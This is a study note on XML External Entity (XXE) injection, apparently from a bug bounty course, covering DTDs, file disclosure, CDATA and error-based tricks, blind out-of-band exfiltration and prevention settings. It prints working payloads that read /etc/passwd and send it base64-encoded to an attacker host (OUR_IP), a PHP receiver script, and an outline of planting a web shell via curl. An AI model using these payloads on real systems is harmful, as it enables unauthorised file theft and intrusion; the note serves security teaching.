Many web apps process XML data as part of their functionality. When the backend process uses outdated XML libraries to process and parse the XML input from the front end user, it may be possible to send malicious XML data to discllose local files store on the back-end server.

XML External Entity Inection (XXE) occurs when XML data is taken from user-controlled input without properly sanitizing or safely parsing it.

### [[Cybersecurity/Bug Bounty Hunter/XML Document Type Definition (DTD)\|XML Document Type Definition (DTD)]]

The DTD provides a pre-defined document structure that the can be used to validate an XML document. The DTD can be defined in the document itself or in an external file. For the mail definition above it might look like:
```xml
<!DOCTYPE email [
  <!ELEMENT email (date, time, sender, recipients, body)>
  <!ELEMENT recipients (to, cc?)>
  <!ELEMENT cc (to*)>
  <!ELEMENT date (#PCDATA)>
  <!ELEMENT time (#PCDATA)>
  <!ELEMENT sender (#PCDATA)>
  <!ELEMENT to  (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
]>
```
The reference, using the keyword `SYSTEM` might look like:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "email.dtd">
```
The DTD can be a reference to a URL:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "http://inlanefreight.com/email.dtd">
```
The keyword `PUBLIC` can be used to reference an external resource.

### XML Entities
We can define custom entities (i.e., XML Variables) in XML DTDs to allow variables to be refactored. This is done by using the `ENTITY` keyword, followed by the entity name and value.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```
The entity can then be referenced in XML using an ampersand `&` and semi-colon `;`. When referenced, the entity is replaced with its value by the xml parser. Importantly, we can reference external entities with the `SYSTEM` keyword.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "http://localhost/company.txt">
  <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
]>
```

This works similarly to internal XML entities defined within documents. When we reference an external entity (e.g. `&signature;`), the parser will replace the entity with its value stored in the external file (e.g. `signature.txt`). `When the XML file is parsed on the server-side, in cases like SOAP (XML) APIs or web forms, then an entity can reference a file stored on the back-end server, which may eventually be disclosed to us when we reference the entity`.

### Local File Disclosure
When a web application trusts unfiltered XML data from user input and that trust is used to reference an external DTD document, defeine new custom XML entities, and get the server to reference the local files and display content rom the back-end server.

#### Identifiying
First, identify the potential vulnerability. We find forms that take in user input and then send the data to the web server in XML format. This can be done using a proxy to examine the data sent when the form is submitted.

Then look for data that is sent to be reflected in some way. (i.e., it's displayed back to us.) We **note which cont is displayed** as that might be a potential injection site.

If we know that, a web page is submitting under a field `<email></email>` we might try and inject a new entity into the doctype:
```xml
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```
Then change the reference in the request to the newly defined entity `&company;`

Then we see if the reflected response contains the parsed entity (i.e., `Inlane Freight`  in the example above. If the parsed entity is returned, then the application is vulnerable to #XXE. #### Remote Code Execution with XXE
To get remote execution, we can try and look for ssh keys, or attempt to utilize a hash stealing trick in Windows-based applications, by making a call ot our server. On PHP based applications we can try and use the `PHP://expect` filter. (This requires that the PHP `expect` module is installed and enabled.)

First write a basic PHP web shell. Then start it as a server on our machine. Then inject a curl command that downloads our shell onto the server.

#### Advanced Exfiltration with CDATA
To output data that does not conform to the XML format, we can wrap the data in the CDATA tag. `<!CDATA[ FILE_CONTENT ]]>.`
One easy way to tackle this issue would be to define a `begin` internal entity with `<![CDATA[`, an `end` internal entity with `]]>`, and then place our external entity file in between, and it should be considered as a `CDATA` element, as follows:
```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```
But XML prevents joining internal and external entities. So we need to trick it by utilizing [[XML Parameter Entities\|XML Parameter Entities]] in the DTD. These entities start with the `%` character and can be only used within the DTD. If we reference these entities from an external source (.e.g, our server) then they are all external and can be joined.

We store a single line in our server:
```xml
<!ENTITY joined "%begin;%file;%end;">
```
Like so:
```shell-session
user@computer[~/]$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
user@computer[!~/]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Now we inject this into the code:
```xml
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```

#### Error Based XXE
When the web application does not write any ouptut we are blind to the XML output and are not able to retrieve the content normally. But if the web application displays runtime errors (e.g., PHP errors) or does not have proper exception handling then we can sometimes read the output anyway.

Host this payload:
```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```
Make the request to call:
```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

### Blind Data Exfiltration
What can we do when the web app sends no output and there aren't any PHP runtime errors to exploit?

#### Out-of-band data Exfiltration
Often used in blind cases for many attacks like blind [[Cybersecurity/Bug Bounty Hunter/SQL Injection/Structured Query Language (SQL) Injection Fundamentals\|SQL Injection]], blind [[Cybersecurity/Bug Bounty Hunter/Command Injections\|Command Injections]], blind [[XSS\|XSS]], and of course, blind XXE.

In this case, we're trying to make the application ouput to a web request to our server that contains the file we are reading.

We use a external parameter entity for the content of the file and use the PHP filter to base64 encode it. Then we create another parameter entity that is referenced to our IP and place the file parameter value as part of the url being requested over HTTP. Our xxe.dtd file looks like:
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

We don't even have to decode it manually. We can use a PHP script to detect the encoded content, decode it and put it to the terminal.
```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```
We write that code to `index.php` then start a PHP server on port 8000 using `php -S 0.0.0.0:8000`

We use a similar payload used in an error based attack and add `<root>&content'</root>` to reference our entity and have the server send the request to our machine.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

### XXE Prevention

XXE is caused primarily by outdated libraries so they are easy to prevent. We should keep our XML components updated. Also, we should update any components that parse XML input, such as API libraries.

### Safe XML Configurations
* Disable DTD
* Disable referencing External XML Entities
* Disable Parameter Entity processing.
* Disable Support for Xinclude.
* Prevent Entity Reference Loops.

Make sure to have proper error handling.
